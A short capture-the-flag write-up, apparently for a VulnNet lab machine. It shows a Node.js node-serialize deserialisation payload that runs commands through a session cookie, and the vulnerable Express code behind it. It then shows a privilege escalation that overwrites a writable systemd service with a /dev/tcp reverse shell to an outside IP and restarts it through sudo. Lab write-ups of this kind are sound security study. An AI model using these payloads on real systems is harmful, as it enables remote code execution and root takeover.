Missed

1. Sending `/` gave a base64 cookie
2. We can change it's value and the response was reflected which suggests some internal parsing
3. Upon more inpsection it was found vulnerable to nodejs deserialisation [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md):

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
```

vulnerable code

```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var path = require('path');
var app = express();
app.use(cookieParser())
app.set('view engine',  'pug');

app.use('/css', express.static('css'));
app.use('/img', express.static('img'));

app.get('/', function(req, res) {
 if (req.cookies.session) {
   var str = new Buffer(req.cookies.session, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     var username2 = JSON.stringify(obj.username).replace(/[^0-9a-z]/gi, '');
     obj.username = username2
     res.render('../index', {username: obj.username})
   }
 } else {
     res.cookie('session', "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==", {
       maxAge: 1200000,
       httpOnly: true
     });
 }
res.render('../index', {username: "Guest"});
});

app.get('/login', function(req, res) {
        res.sendFile(path.join(__dirname+'/login.html'));
});
app.listen(8080);
```

---

priv esc

```console
serv-manage@ip-10-48-138-121:~$ sudo -l
sudo -l
Matching Defaults entries for serv-manage on ip-10-48-138-121:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on ip-10-48-138-121:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
    
serv-manage@ip-10-48-138-121:~$ systemctl cat vulnnet-auto.timer
systemctl cat vulnnet-auto.timer
# /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target

serv-manage@ip-10-48-138-121:~$ ls -l /etc/systemd/system/vulnnet-job.service
ls -l /etc/systemd/system/vulnnet-job.service
-rw-rw-r-- 1 root serv-manage 197 May 28 08:36 /etc/systemd/system/vulnnet-job.service

serv-manage@ip-10-48-138-121:~$ cat > /etc/systemd/system/vulnnet-job.service <<'EOF'
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
Type=forking
ExecStart=/bin/bash -c 'sh -i >& /dev/tcp/192.168.247.244/9090 0>&1'

[Install]
WantedBy=multi-user.target
EOF

serv-manage@ip-10-48-138-121:~$ sudo -u root /bin/systemctl daemon-reload
sudo -u root /bin/systemctl daemon-reload
serv-manage@ip-10-48-138-121:~$ sudo /bin/systemctl stop vulnnet-auto.timer
sudo /bin/systemctl stop vulnnet-auto.timer
serv-manage@ip-10-48-138-121:~$ sudo /bin/systemctl start vulnnet-auto.timer   
sudo /bin/systemctl start vulnnet-auto.timer
```
